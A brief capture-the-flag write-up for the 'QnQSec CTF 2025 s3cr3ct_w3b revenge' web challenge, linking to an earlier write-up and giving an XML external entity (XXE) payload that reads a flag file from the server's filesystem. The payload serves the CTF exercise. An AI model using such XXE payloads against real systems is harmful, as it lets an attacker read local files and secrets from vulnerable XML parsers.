# QnQSec CTF 2025 - s3cr3ct_w3b revenge
Exactly the same with `s3cr3ct_w3b` :Đ

[**QnQSec CTF 2025 — s3cr3ct_w3b**]([https://www.notion.so/QnQSec-CTF-2025-s3cr3ct_w3b-28f9cb9a12cb80e48464ea2cf72769d2?pvs=21](https://github.com/trannghiach/CTF-Writeups/blob/main/QnQSec%20CTF%202025/Web/s3cr3ct_w3b.md))

Change your payload to:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/flags/flag.txt"> ]>
<data>&xxe;</data>
```

Because they changed the Dockerfile
